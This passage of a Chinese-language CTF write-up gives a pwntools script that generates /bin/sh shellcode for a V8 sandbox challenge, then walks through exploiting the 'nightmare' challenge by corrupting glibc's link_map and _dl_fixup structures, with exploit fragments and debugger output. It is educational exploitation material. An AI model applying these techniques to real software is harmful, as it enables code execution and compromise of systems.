之後只要透過 aaw 蓋掉 `JSFunction` code 使其執行到我們構造的 shellcode chain 即可，附上產生 shellcode 的腳本，實際 exploit 參考 [Mem2019 的 github](https://github.com/Mem2019/Mem2019.github.io/blob/master/codes/memory-hole-1984.js)：

```python
#!/usr/bin/python3

from pwn import *

context.arch = 'amd64'

binsh1 = 0x0068732f
binsh2 = 0x6e69622f

shellcodes = [
    f"push {binsh1} ; pop rax",
    f"push {binsh2} ; pop rdx",
    "shl rax, 0x20 ; xor esi, esi",
    "add rax, rdx ; xor edx, edx ; push rax",
]
jmp = asm("jmp .+14")
final = asm("mov rdi, rsp ; push 0x59 ; pop rax ; syscall")

for sc in shellcodes:
    sc_asm = asm(sc)
    assert(len(sc_asm) <= 6)
    sc_asm = sc_asm.ljust(6, b'\x90') + jmp
    print(hex(u64(sc_asm))[2:])
print(hex(u64(final))[2:])

# https://www.binaryconvert.com/convert_double.html
"""
1.95538254221075331056310651818E-246
1.95606125582421466942709801013E-246
1.99957147195425773436923756715E-246
1.95337673326740932133292175341E-246
2.63489895655547273676039775372E-284
"""
```



參考資料：

- [[DiceCTF 2022] - memory hole](https://blog.kylebot.net/2022/02/06/DiceCTF-2022-memory-hole)
- [Dice CTF Memory Hole: Breaking V8 Heap Sandbox](https://mem2019.github.io/jekyll/update/2022/02/06/DiceCTF-Memory-Hole.html)



### nightmare

> Glibc version 為 2.34，當初在嘗試 2.31 時因為 `_r_debug` 距離 binary 的 `link_map` 只有 0x30 的大小，寫入時容易覆蓋到 pointer，因此最後使用 2.34 的 Glibc，但是一些利用的概念應該是可以在 Glibc 2.31 中運作，至少到無限迴圈寫入還可以。

```
// file
./nightmare: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=ae4c0a84ff641e8a3bed85fc90d111688aec509a, for GNU/Linux 4.4.0, with debug_info, not stripped

// checksec
[*] '/tmp/bin/nightmare'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    
// seccomp rule
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x0b 0xc000003e  if (A != ARCH_X86_64) goto 0013
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x15 0x08 0x00 0x00000000  if (A == read) goto 0012
 0004: 0x15 0x07 0x00 0x00000001  if (A == write) goto 0012
 0005: 0x15 0x06 0x00 0x00000002  if (A == open) goto 0012
 0006: 0x15 0x05 0x00 0x0000003c  if (A == exit) goto 0012
 0007: 0x15 0x04 0x00 0x000000e7  if (A == exit_group) goto 0012
 0008: 0x15 0x01 0x00 0x00000009  if (A == mmap) goto 0010
 0009: 0x05 0x00 0x00 0x00000003  goto 0013
 0010: 0x20 0x00 0x00 0x00000020  A = prot # mmap(addr, len, prot, flags, fd, pgoff)
 0011: 0x45 0x01 0x00 0x00000004  if (A & 0x4) goto 0013
 0012: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0013: 0x06 0x00 0x00 0x00000000  return KIL
```



以下為題目原始碼，因為 `malloc()` 在 size 夠大時，會透過 `mmap()` 來建立空間，因此簡單來說，你可以在 libc / ld / tls 中寫一個 bytes，不過在寫完之後會呼叫 `_Exit(0)` 離開程式：

```c
void __attribute__((constructor)) nightmare()
{
    if (!chunk)
    {
        chunk = malloc(0x40000);
        seccomp();
    }
    uint8_t byte = 0;
    size_t offset = 0;

    read(0, &offset, sizeof(size_t));
    read(0, &byte, sizeof(uint8_t));

    chunk[offset] = byte;

    write(1, "BORN TO WRITE WORLD IS A CHUNK 鬼神 LSB Em All 1972 I am mov man 410,757,864,530 CORRUPTED POINTERS", 101);
    _Exit(0);
}

int main()
{
 	_Exit(0);   
}
```

由於 `_Exit(0)` 在正常執行的情況下不返回任何值，因此 gcc 在編譯時會自動做最佳化，不幫 function 加上 epilogue，因此 function 的結尾緊接著會是另一個 function，舉 `nightmare()`、`main()` 以及 `__libc_csu_init()` 為例：

```asm
   0x5555555553d4 <nightmare+158>:      call   0x555555555030 <write@plt>
   0x5555555553d9 <nightmare+163>:      mov    edi,0x0
   0x5555555553de <nightmare+168>:      call   0x555555555080 <_Exit@plt>
   0x5555555553e3 <main>:       push   rbp
   0x5555555553e4 <main+1>:     mov    rbp,rsp
   0x5555555553ec <main+9>:     call   0x555555555080 <_Exit@plt>
   0x5555555553f1:      nop    WORD PTR cs:[rax+rax*1+0x0]
   0x5555555553fb:      nop    DWORD PTR [rax+rax*1+0x0]
   0x555555555400 <__libc_csu_init>:    endbr64
   0x555555555404 <__libc_csu_init+4>:  push   r15
   ...
```

然而，因為 `__libc_csu_init()` 會呼叫到 `nightmare()`，因此若是能讓 `_Exit(0)` 不呼叫 `sys_exitgroup`，就能持續透過 `__libc_csu_init()` --> `nightmare()` --> `main()` 不斷寫入，不被侷限在 1 個 bytes 了。不過要怎麼讓 `_Exit(0)` 不成功執行 sysexit 呢？ 因為 relocation 的型態為 **Partial RELRO**，因此在實際呼叫時才會 binding，不過因為 `mmap()` 出來的位址在 code base 下方，因此無法透過竄改 `_Exit@got` 成 gadget `ret` 來做，我們把目標放在動態鏈結會使用到的相關結構，也就是 `strcut link_map`，關於動態鏈結執行的過程可參考我所做的 [DynamicLinking](learning/DynamicLinking.md) 分析紀錄，以及上方 **data-eater** 所做的 `_dl_fixup()` 分析，整個過程大致如下：

- 初始化時 `_Exit@got` 會放 `push <rel_offset> ; jmp push_link_map` 的 gadget，而 `push_link_map` 為所有 GOT 所共用，執行 `push link_map ; jmp _dl_runtime_resolve_fxsave`
- `_dl_runtime_resolve_fxsave()` 為 `_dl_fixup()` 的 wrapper，因為呼叫 `_dl_fixup()` 前會需要根據執行環境保存一些狀態
- `_dl_fixup()` 會傳入兩個參數，可以看成 `_dl_fixup(link_map, reloc_offset)`，並且執行過程中會取出對應 symbol 的名字，再透過一連串的 dl function call 去解析



link_map 結構中的第一個 member `l_addr` 存放 ASLR 的 code base address，因此對齊 `0x1000`，末 12 bits 必定為 0，我們可以控制 `l_addr`，讓 `_Exit@got` 解析時實際上解析到 `write()`，因為在參數不對的情況下，`write()` 並不會造成程式終止，實際上的作法與 **data-eater** 有些相似，下方會一一介紹。

---

### 1. resolve write to _Exit@got and then infinitely write

```python
gotoff__Exit_write = e.got["_Exit"] - e.got["write"]
write(binary_map.l_addr(), p8(gotoff__Exit_write))
```

- 先將 `link_map->l_addr` 的 least bytes 改成為 `e.got["_Exit"] - e.got["write"]`，因為在第一次執行 `write()` 時會呼叫 `_dl_fixup()` 載入 `write()` 實際的位址

- `_dl_fixup()` 當中：

  ```c
  _dl_fixup (
  # ifdef ELF_MACHINE_RUNTIME_FIXUP_ARGS
  	   ELF_MACHINE_RUNTIME_FIXUP_ARGS,
  # endif
  	   struct link_map *l, ElfW(Word) reloc_arg)
  {
    const ElfW(Sym) *const symtab
      = (const void *) D_PTR (l, l_info[DT_SYMTAB]);
    const char *strtab = (const void *) D_PTR (l, l_info[DT_STRTAB]);
  
    const PLTREL *const reloc
      = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);
    const ElfW(Sym) *sym = &symtab[ELFW(R_SYM) (reloc->r_info)];
    const ElfW(Sym) *refsym = sym;
    void *const rel_addr = (void *)(l->l_addr + reloc->r_offset);
    lookup_t result;
    ...
  }
  ```

  解析完的 function 會被寫入 `rel_addr` 指向的位址當中，而 `rel_addr` 的值來自於 `l->l_addr + reloc->r_offset`，但因為 `l->l_addr` 此時多了 `_Exit` 與 `write` 的 offset，因此最終會把 `write()` 的位址寫入 `_Exit@got` 內，讓 `_Exit()` 不會中止程式，讓我們有了多次寫入的機會

---

### 2. clear version info and write code base

即使有了任意寫入，但我們沒有任何關於 address 的 information，因此很難控制程式的執行流程
，不過 link_map 中有一個 pointer " `l->l_info[DT_FINI]`" 被用來定義程式終止時呼叫的 fini function，當呼叫 `exit()` (沒有底線的版本) 時，會在 exit handler 的結尾呼叫到 `_dl_fini()`，此 function 會間接呼叫到 `l_addr + l->l_info[DT_FINI].d_un.d_ptr` 存放的 destructor function ([src](https://elixir.bootlin.com/glibc/glibc-2.31/source/elf/dl-fini.c#L141))：

```c
/* Next try the old-style destructor.  */
if (l->l_info[DT_FINI] != NULL)
	DL_CALL_DT_FINI (l, l->l_addr + l->l_info[DT_FINI]->d_un.d_ptr);
```

這可以當作我們最後控制執行流程的，但在此之前，我們仍需想辦法取得 address 的資訊。



此時介紹一個變數 `_r_debug`，這個變數位於 **ld.so** 當中，對應到的結構為 `(struct r_debug *)`，而其位址在動態鏈結時會也會被載入到 ELF 當中，對應到的 `l_info` 是 `l_info[DT_DEBUG].d_un.d_ptr` (`DT_DEBUG` == 21)，此變數似乎在 debug 的時候會使用到，不過不管有沒有在 debugging，只要 ELF 的 Dynamic section 存在 **DEBUG** 都會在執行時加載到對應的位址。

如果我們可以將 `l->l_info[DT_FINI]` 蓋為 ` l->l_info[DT_DEBUG]`，這樣 `l->l_info[DT_FINI]->d_un.d_ptr` 取出的值就會是 `_r_debug` 的位址，若將此位址視為 library base address，那 `l->l_addr` 就可以看成是我要執行的 function 相對於 libc base addr 的 offset。並且 link_map 的許多資料都是以 offset 的方式保存，這樣的好處 handle ASLR 時只需要改存放 base address 的成員 (`l_address`)，這樣加上 offset 就可以快速取得對應的資源。

---



而 `_r_debug` 還有另外一個用途，因為內容控制得到，並且又是 `l->l_info[DT_DEBUG]`，因此我們可以透過更改 `_r_debug` 變數的內容成為其他 `l->l_info[DT_XXX]` 的 entry，並將對應到的 `l->l_info[DT_XXX]` 的末 1 bytes 改成是 `l->l_info[DT_DEBUG]` 對應到的位址，舉例來說如果要構造出一個自定義的 `l_info[DT_JMPREL]`：

1. 改寫 `_r_debug` 的值成 ` Elf64_Rela` 結構，`Elf64_Rela` 存放在解析時，解析到的位址的 offset address、relocation type 等等

   ```c
   typedef struct
   {
     Elf64_Addr	r_offset;		/* Address */
     Elf64_Xword	r_info;			/* Relocation type and symbol index */
     Elf64_Sxword	r_addend;		/* Addend */
   } Elf64_Rela;
   ```

2. 把 `l_info[DT_JMPREL]` 的 last byte 改成是 `l_info[DT_BUG]` 的 last byte，這樣 `_dl_fixup()` 時：

   ```c
   _dl_fixup (struct link_map *l, ElfW(Word) reloc_arg)
   {
     const ElfW(Sym) *const symtab
       = (const void *) D_PTR (l, l_info[DT_SYMTAB]);
     const char *strtab = (const void *) D_PTR (l, l_info[DT_STRTAB]);
   
     const PLTREL *const reloc
       = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);
     ...
     void *const rel_addr = (void *)(l->l_addr + reloc->r_offset);
   ```

   `reloc` 的值最後取得的就會是 `_r_debug` 的位址，而 `_r_debug` 內容也存放著我們已經控制好的 `struct Elf64_Rela`；`rel_addr` 的值會是我們先前竄改過的 `l->l_addr` 加上新的 `reloc->r_offset`，因此篡改後解析完寫到的位址就會不相同

3. 最後結果如下：

   - 篡改前

     ```shell
     pwndbg> p *reloc
     $1 = {
       r_offset = 16408, # 0x4018
       r_info = 8589934599, # 0x200000007
       r_addend = 0
     }
     ```

   - 篡改後

     ```shell
     pwndbg> p *reloc
     $2 = {
       r_offset = 16640, # 0x4100
       r_info = 34359738375, # 0x800000007
       r_addend = 0
     }
     ```



除此之外我們還會用到 `struct Elf64_Sym` 來製作 fake symbol table，在解析時會參考此結構的成員來做相對應的行為，結構如下：

```c
typedef struct
{
  Elf64_Word	st_name;		/* Symbol name (string tbl index) */
  unsigned char	st_info;		/* Symbol type and binding */
  unsigned char st_other;		/* Symbol visibility */
  Elf64_Section	st_shndx;		/* Section index */
  Elf64_Addr	st_value;		/* Symbol value */
  Elf64_Xword	st_size;		/* Symbol size */
} Elf64_Sym;
```

利用到的程式碼列在下方，對應的行為用註解表示：

```c
#define DL_FIXUP_MAKE_VALUE(map, addr) (addr)

#define SYMBOL_ADDRESS(map, ref, map_set)				\
  ((ref) == NULL ? 0							\
   : (__glibc_unlikely ((ref)->st_shndx == SHN_ABS) ? 0			\
      : LOOKUP_VALUE_ADDRESS (map, map_set)) + (ref)->st_value)
#define LOOKUP_VALUE_ADDRESS(map, set) ((set) || (map) ? (map)->l_addr : 0)

_dl_fixup (...)
{
  const ElfW(Sym) *const symtab
    = (const void *) D_PTR (l, l_info[DT_SYMTAB]);
  ...
  const PLTREL *const reloc
    = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);
  const ElfW(Sym) *sym = &symtab[ELFW(R_SYM) (reloc->r_info)];
  ...
  void *const rel_addr = (void *)(l->l_addr + reloc->r_offset);
  ...
  if (__builtin_expect (ELFW(ST_VISIBILITY) (sym->st_other), 0) == 0)
  { ... /* 解析位址 */ }
  else
  {
      // value 結果會是 l->l_addr + sym->st_value
      // 篡改後，在此得到的值是 _init() 位址
      value = DL_FIXUP_MAKE_VALUE (l, SYMBOL_ADDRESS (l, sym, true));
      result = l;
  }
  ...
  // 等同於 *rel_addr = value
  // 在篡改後會把 _init() 位址寫到 0x555555558128
  return elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value);
}
```

- 篡改前

  ```shell
  pwndbg> p *sym
  $1 = {
    st_name = 39, # malloc
    st_info = 18 '\022',
    st_other = 0 '\000', # STV_DEFAULT
    st_shndx = 0, # SHN_UNDEF
    st_value = 0,
    st_size = 0
  }
  ```

- 篡改後

  ```shell
  pwndbg> p *sym
  $1 = {
    st_name = 0,
    st_info = 18 '\022',
    st_other = 1 '\001', # STV_PROTECTED
    st_shndx = 0, # SHN_UNDEF
    st_value = 4056,
    st_size = 0
  }
  ```

  - `st_other` 用來儲存 symbol 的 visibility，一共分成：
    - STV_DEFAULT (0) - 取決於 symbol 的 binding type，global 跟 week 可以被外部看到，local 就不行 (hidden)
    - STV_PROTECTED (1) - 可以被外部看到，但不能有衝突 (not preemptable)，代表需要被自己 local 解析
    - STV_HIDDEN (2) - 不能被外部看到
    - STV_INTERNAL (3)
    - 細節可以參考[此手冊](https://refspecs.linuxbase.org/elf/gabi4+/ch4.symtab.html#visibility)

- 當我們竄改成功時 `symtab` 會指向 `_r_debug`，而因為 `reloc->r_info` 紀錄著 `write` 的 offset 為 8，因此他會取出 `_r_debug + sizeof(Elf64_Sym)*8` 作為 `write` 的 symbol，並在最後將 `_init()` 的位址寫到某個 binary 中的位址



而在較新的 binary 會採取 versioning，指定從哪個 library 當中解析 function，相關資訊會存在於 `l->l_info[DT_VER]`，較舊的 binary 將其寫成 NULL，致使 symbol 的尋找範圍不限於某個 library 當中。

實際上 glibc versioning 與 [elf/dl-version](https://elixir.bootlin.com/glibc/glibc-2.31/source/elf/dl-version.c) 內的 function 相關，不過我不確定呼叫的時機點為何，但為了確保不影響執行結果，因此將 `l->l_info[DT_VER]` 寫成 NULL。關於 versioning 的詳細資訊可以參考[此篇文章](https://maskray.me/blog/2020-11-26-all-about-symbol-versioning#%E4%B8%AD%E6%96%87%E7%89%88)。



到此，我們找到能控制執行流程的目標 `l->l_info[DT_FINI]`，但是還需要做一些 setup。我們先透過製作假的 struct rela / symbol table，讓 code address 寫入到 binary 當中的某個位址，並且清除 `l->l_info[DT_VER]` 的 pointer 避免受到 versoning 影響。

```python
set_rela_table(elf64_rela(0x4100, 0x800000007, 0))
set_sym_table(elf64_sym(0, 0x12, 1, 0, e.symbols['_init'] - gotoff__Exit_write, 0))
write(binary_map.l_info(d_tag['DT_VER']), p64(0))
restore_sym_table()
restore_rela_table()
```

---

### 3. resolve function to _dl_fini of ld

在此之前需要先了解 `_dl_fixup()` 背後所呼叫的 function `_dl_lookup_symbol_x()` 以及 `do_lookup_x()`：

`_dl_fixup()` 解析完後的處理：

```c
#
// entry point
_dl_fixup()
{
    ...
    // result 回傳的會是 symbol 對應到的 link_map
    result = _dl_lookup_symbol_x (strtab + refsym->st_name, l,
                                  &defsym, l->l_scope, version,
                                  ELF_RTYPE_CLASS_PLT, flags, NULL);
    ...
    // value = result->l_addr + defsym->st_value，也就是 symbol 對應到的位址
    value = DL_FIXUP_MAKE_VALUE (result, SYMBOL_ADDRESS (result, sym, false));
    ...
    // *rel_addr = value，將 address 寫到 GOT 當中
    return elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value)
}
```

`_dl_lookup_symbol_x()`：

```c
// undef_name: symbol string, e.g. "write"
// scope: an array defining the lookup scope for this link map
lookup_t
_dl_lookup_symbol_x(const char *undef_name,
                    struct link_map *undef_map, /* 要解析的 symbol 所在的 link_map */
                    const ElfW(Sym) * *ref,
                    struct r_scope_elem *symbol_scope[],
                    const struct r_found_version *version,
                    int type_class, int flags, struct link_map *skip_map)
{
    // 產生出新的 hash value
    const uint_fast32_t new_hash = dl_new_hash(undef_name);
    unsigned long int old_hash = 0xffffffff;
    struct sym_val current_value = {NULL, NULL};
    struct r_scope_elem **scope = symbol_scope;

    // version 會傳入 GLIBC_2.2.5 的 r_found_version 結構
    // flags == 1 and DL_LOOKUP_RETURN_NEWEST == 2
    assert(version == NULL || !(flags & DL_LOOKUP_RETURN_NEWEST));

    size_t i = 0;
    // NULL
    if (__glibc_unlikely(skip_map != NULL)) { ... /* do something */}

    // 搜尋每個 scope，透過 do_lookup_x() 找對應 symbol 的 definition
    for (size_t start = i; *scope != NULL; start = 0, ++scope)
        // _dl_fixup 傳入 ELF_RTYPE_CLASS_PLT 作為 type_classe
        if (do_lookup_x(undef_name, new_hash, &old_hash, *ref,
                        &current_value /* 回傳的結果 */,
                        *scope, start, version, flags,
                        skip_map, type_class, undef_map) != 0)
            break;
    
    // 結果會存在於變數 current_value
    // sym_val.s: Elf64_Sym ; sym_val.m: link_map
    if (__glibc_unlikely(current_value.s == NULL)) // 沒找到
    {
        if ((*ref == NULL || ELFW(ST_BIND)((*ref)->st_info) != STB_WEAK) && !(GLRO(dl_debug_mask) & DL_DEBUG_UNUSED))
        {
            // 沒找到 strong reference
            const char *reference_name = undef_map ? undef_map->l_name : "";
            const char *versionstr = version ? ", version " : "";
            const char *versionname = (version && version->name
                                           ? version->name
                                           : "");
			... // dl error handling
        }
        *ref = NULL; // 沒有結果
        return 0;
    }

    // 檢查取得的 object type 是否為 protected
    int protected = (*ref && ELFW(ST_VISIBILITY)((*ref)->st_other) == STV_PROTECTED);
    if (__glibc_unlikely(protected != 0)) // 如果是 protected
    {
        // GOT resolve 的情況
        if (type_class == ELF_RTYPE_CLASS_PLT)
        {
            if (current_value.s != NULL && current_value.m != undef_map)
            {
                current_value.s = *ref;
                current_value.m = undef_map;
            }
        }
        else // 在某些情況下 type_class != ELF_RTYPE_CLASS_PLT，也許是要找 extern data ?
        {
            struct sym_val protected_value = {NULL, NULL};

            // 重新再找一次，不過 type_class 不一樣
            for (scope = symbol_scope; *scope != NULL; i = 0, ++scope)
                if (do_lookup_x(undef_name, new_hash, &old_hash, *ref,
                                &protected_value, *scope, i, version, flags,
                                skip_map,
                                (ELF_RTYPE_CLASS_EXTERN_PROTECTED_DATA && ELFW(ST_TYPE)((*ref)->st_info) == STT_OBJECT && type_class == ELF_RTYPE_CLASS_EXTERN_PROTECTED_DATA)
                                    ? ELF_RTYPE_CLASS_EXTERN_PROTECTED_DATA
                                    : ELF_RTYPE_CLASS_PLT,
                                NULL) != 0)
                    break;

            if (protected_value.s != NULL && protected_value.m != undef_map)
            {
                current_value.s = *ref;
                current_value.m = undef_map;
            }
        }
    }
    // 取得的 object 對應到的 link_map 為 run-time loaded shared object
    // 加上 dependency，確保當前 link_map(undef_map) 與 target symbol 真正所在的 link_map 的釋放順序，一定是當前的先被釋放，後續才能釋放 target 的
    if (__glibc_unlikely(current_value.m->l_type == lt_loaded)
        && (flags & DL_LOOKUP_ADD_DEPENDENCY) != 0
		// 加上 dependency
        && add_dependency(undef_map, current_value.m, flags) < 0)
        // 可能因為 reference 到剛被 remove 掉的 object 而出現問題，再找一次
        return _dl_lookup_symbol_x(undef_name, undef_map, ref,
                                   (flags & DL_LOOKUP_GSCOPE_LOCK)
                                       ? undef_map->l_scope
                                       : symbol_scope,
                                   version, type_class, flags, skip_map);

	// mark target 的 link_map 正在被使用
    if (__glibc_unlikely(current_value.m->l_used == 0))
        current_value.m->l_used = 1;

	... // for debugging
    *ref = current_value.s;
    // #define LOOKUP_VALUE(map) map
    // 其實就時回傳 current_value.m
    return LOOKUP_VALUE(current_value.m);
}
```

- 當 binary 有 external data reference，因為 data 定義在 shared object 當中，在動態鏈結時才會知道確切的 value，因此 compiler 會使用 **copy relocation**，將 symbol 複製一份放在 binary .bss 當中
- object 的來源分成三個：
  - lt_executable - The main executable program
  - lt_library - Library needed by main executable
  - lt_loaded - Extra run-time loaded shared object



`do_lookup_x()`：

```c
// 實際 lookup function 的實作，如果找到 symbol 的位址，return value > 0；如果 == 0 代表沒找到；如果 < 0 代表出現錯誤
static int
    __attribute_noinline__
    do_lookup_x(const char *undef_name, uint_fast32_t new_hash,
                unsigned long int *old_hash, const ElfW(Sym) * ref,
                struct sym_val *result, struct r_scope_elem *scope, size_t i,
                const struct r_found_version *const version, int flags,
                struct link_map *skip, int type_class, struct link_map *undef_map)
{
    size_t n = scope->r_nlist;
    // 放一個 read barrier，確保在處理前讀取 value，否則可能讓 r_list 指向 init scope
    __asm volatile("": "+r"(n), "+m"(scope->r_list));
    struct link_map **list = scope->r_list;
    do
    {
        const struct link_map *map = list[i]->l_real;
        // 為了 _dl_lookup_symbol_skip() 額外做的檢查
        if (map == skip) continue;

        // 不要在解析 copy reloc 時搜尋 binary 本身，因為這個 type 本身就是讓 binary 去外部解析對應的 address
        if ((type_class & ELF_RTYPE_CLASS_COPY) && map->l_type == lt_executable)
            continue;
        // 不要找要被 remove 掉的 object
        if (map->l_removed)
            continue;
        // hash table empty ---> 沒有 symbol 
        if (map->l_nbuckets == 0)
            continue;

        Elf_Symndx symidx;
        int num_versions = 0;
        const ElfW(Sym) *versioned_sym = NULL;

        // 取出 symtab 以及 strtab
        const ElfW(Sym) *symtab = (const void *)D_PTR(map, l_info[DT_SYMTAB]);
        const char *strtab = (const void *)D_PTR(map, l_info[DT_STRTAB]);

        const ElfW(Sym) * sym;
        const ElfW(Addr) *bitmask = map->l_gnu_bitmask;
        // l_gnu_bitmask, l_gnu_bitmask_idxbits 等等成員與 symbol hash table 相關
        if (__glibc_likely(bitmask != NULL))
        {
			...

            if (... /* hash check*/)
            {
                Elf32_Word bucket = map->l_gnu_buckets[new_hash % map->l_nbuckets];
                if (bucket != 0) // 代表不為空，會用 hash array 保存 hash entry
                {
                    const Elf32_Word *hasharr = &map->l_gnu_chain_zero[bucket];
                    do
                        if (((*hasharr ^ new_hash) >> 1) == 0)
                        {
                            // 計算 ((hasharr) - (map)->l_gnu_chain_zero) 取得 symbol 在 GNU hash 的 index
                            symidx = ELF_MACHINE_HASH_SYMIDX(map, hasharr);
                            // 檢查是否相同
                            sym = check_match(undef_name, ref, version, flags,
                                              type_class, &symtab[symidx], symidx,
                                              strtab, map, &versioned_sym,
                                              &num_versions);
                            if (sym != NULL) // 找到 symbol
                                goto found_it;
                        }
                    // hash value 的最後一個 bit 如果是 0，代表 entry 不是最後一個
                    while ((*hasharr++ & 1u) == 0);
                }
            }
            // 沒找到
            symidx = SHN_UNDEF;
        }
        else
        {
            if (*old_hash == 0xffffffff)
                *old_hash = _dl_elf_hash(undef_name);

            // 使用相較舊的 SysV-style 的 hash table，找應 symbol 的 hash bucket 並取出 object
            for (symidx = map->l_buckets[*old_hash % map->l_nbuckets];
                 symidx != STN_UNDEF;
                 symidx = map->l_chain[symidx])
            {
                sym = check_match(undef_name, ref, version, flags,
                                  type_class, &symtab[symidx], symidx,
                                  strtab, map, &versioned_sym,
                                  &num_versions);
                if (sym != NULL) // matching
                    goto found_it;
            }
        }

        // 如果找到一個 versioned 版本的 symbol，但我們要找的是沒版本的，一樣接受
        sym = num_versions == 1 ? versioned_sym : NULL;

        if (sym != NULL)
        {
        found_it:
            // 如果 undef_map == NULL，代表這 function 是被 do_lookup_x() 所呼叫，並且target 還是 protected data，我們就直接跳過 binary 的 copy reloc 的 data definition
            if (ELF_RTYPE_CLASS_EXTERN_PROTECTED_DATA && undef_map == NULL && map->l_type == lt_executable && type_class == ELF_RTYPE_CLASS_EXTERN_PROTECTED_DATA)
            {
                const ElfW(Sym) * s;
                unsigned int i;

#if !ELF_MACHINE_NO_RELA
// x86_64/dl-machine.h 定義為 0
                
                // 確定 link_map 包含 rela 相關的資訊
                if (map->l_info[DT_RELA] != NULL && map->l_info[DT_RELASZ] != NULL && map->l_info[DT_RELASZ]->d_un.d_val != 0)
                {
                    const ElfW(Rela) *rela = (const ElfW(Rela) *)D_PTR(map, l_info[DT_RELA]);
                    unsigned int rela_count = map->l_info[DT_RELASZ]->d_un.d_val / sizeof(*rela);

                    for (i = 0; i < rela_count; i++, rela++)
                        // 找為 copy reloc 的 symbol，如果有相同的就跳過
                        if (elf_machine_type_class(ELFW(R_TYPE)(rela->r_info)) == ELF_RTYPE_CLASS_COPY)
                        {
                            s = &symtab[ELFW(R_SYM)(rela->r_info)];
                            if (!strcmp(strtab + s->st_name, undef_name))
                                goto skip;
                        }
                }
#endif
#if !ELF_MACHINE_NO_REL
// x86_64/dl-machine.h 定義為 1
                ...
#endif
            }
            // hidden / internal symbol 不能被解析到，跳過此 symbol
            if (__glibc_unlikely(dl_symbol_visibility_binds_local_p(sym)))
                goto skip;

            switch (ELFW(ST_BIND)(sym->st_info))
            {
            case STB_WEAK:
                // weak definition，如果沒找到其他的在回傳
                if (__glibc_unlikely(GLRO(dl_dynamic_weak)))
                {
                    if (!result->s)
                    {
                        result->s = sym;
                        result->m = (struct link_map *)map;
                    }
                    break;
                }
            case STB_GLOBAL:
				// global definition 直接回傳
                result->s = sym;
                result->m = (struct link_map *)map;
                return 1;

            // compiler 確保在 inline functions 當中的 template static data members 跟 static local variables 為 unique
            case STB_GNU_UNIQUE:;
                do_lookup_unique(undef_name, new_hash, (struct link_map *)map,
                                 result, type_class, sym, strtab, ref,
                                 undef_map, flags);
                return 1;

            default: break;
            }
        }

    skip:;
    } while (++i < n); // 當前 score 的 list entry 個數 (n == scope->r_nlist)
    return 0;
}
```

- 結果會存在傳進來的 `sym` pointer 當中



在這個階段中我們的目標為在 `write@got` 寫入 `_dl_fini()` 的位址，並且先 disable 呼叫 destructor，這樣就能在蓋寫 `_dl_init_array` 後控制程式的執行流程。



首先我們在 `_GLOBAL_OFFSET_TABLE_`，也就是 ld 的 GOT table 當中構造出一個 fake symbol table entry，目標 symbol 可以為任意的動態鏈結變數，在這次利用中使用的是 `_dl_x86_get_cpu_features()`，並且我們只需要變動 `st_value` 成 **target function address - ld base address**，這樣就能在 `_dl_x86_get_cpu_features()` 被執行到時呼叫 target function。

- P.S. `_dl_x86_get_cpu_features()` 為 Glibc2.33 之後才有



這裡的 target function 為 `_dl_fini()`，比較原本的 `_dl_x86_get_cpu_features` symbol：

```shell
$1 = {
  st_name = 358,
  st_info = 18 '\022',
  st_other = 0 '\000',
  st_shndx = 13,
  st_value = 113584,
  st_size = 12
}
```

構造出的 `_dl_x86_get_cpu_features` symbol：

```shell
$4 = {
  st_name = 358,
  st_info = 18 '\022',
  st_other = 0 '\000',
  st_shndx = 13,
  st_value = 67136,
  st_size = 12
}
```



將 fake symbol table entry 放在 `_GLOBAL_OFFSET_TABLE_` 之後的原因在於，可以透過蓋寫 last byte 讓 `l->l_info[DT_SYMTAB]` 指向 `l->l_info[DT_PLTGOT]`，而該位址為可以寫入的記憶體區段，因此可以構造出任意的 `Elf64_Sym`。

到此，我們呼叫 `_dl_x86_get_cpu_features()` 也等同於呼叫 `_dl_fini()`，但是 binary 當中並沒有可以呼叫到此 function 的地方。在上個步驟中我們改寫了 `DT_JMPREL` 以及 `DT_SYMTAB` 的 l_info 位址，在這邊我們只要讓 function name 變成 `_dl_x86_get_cpu_features` 就好，所以這次要改寫的是 `DT_STRTAB`，也是將 `"_dl_x86_get_cpu_features"` 字串構造在 `_r_debug` 當中，再透過把 `l->l_info[DT_STRTAB]` 蓋成 `l->l_info[DT_DEBUG]`，其中字串與 `_r_debug` 的距離需要與一開始呼叫的 function 的 string table offset 相同，舉例來說，binary 中紀錄 `write()` 的 string table offset 為 0x4b，這樣 `"_dl_x86_get_cpu_features"` 就要寫在 `_r_debug+0x4b`。



只要一更新 string table 後，每次呼叫 `write()` 時會去解析對應的 symbol name `"_dl_x86_get_cpu_features"`，`_dl_x86_get_cpu_features` symbol 會透過 `_dl_lookup_symbol_x()` 解析出來，但是在 ld 當中記錄的 `_dl_x86_get_cpu_features` symbol，其結構 `Elf64_Sym->st_value` 存放的值做完運算後，得到的結果會是 `_dl_fini()` 的位址，到了 `_dl_fixup()` 時會更新到 GOT 當中。同時我們也需要調整 `write()` 寫到的 GOT entry，因此再次透過  `_r_debug` 構造一個假的 Rela 結構，讓解析完的位址會確實被寫入 `write@GOT` 當中。



不過改寫 function 成 `_dl_init()` 前，需要注意透過蓋寫 link_map 當中的成員 `l_init_called`，因為在 `_dl_fini()` 時會透過此成員判斷是否呼叫 destructor。篡改前：

```shell
  l_direct_opencount = 1,
  l_type = lt_executable,
  l_relocated = 1,
  l_init_called = 1,
  l_global = 1,
  l_reserved = 0,
  l_phdr_allocated = 0,
```

篡改後：

```shell
  l_direct_opencount = 1,
  l_type = lt_executable,
  ##### edit  #####
  l_relocated = 0,
  l_init_called = 0,
  l_global = 0,
  #################
  l_reserved = 0,
  l_phdr_allocated = 0,
```

在 `_dl_fini()` 時會判斷 `l_init_called` 來決定要不要呼叫 destructor：

```c
void
_dl_fini (void)
{
    ...
    for (i = 0; i < nmaps; ++i)
    {
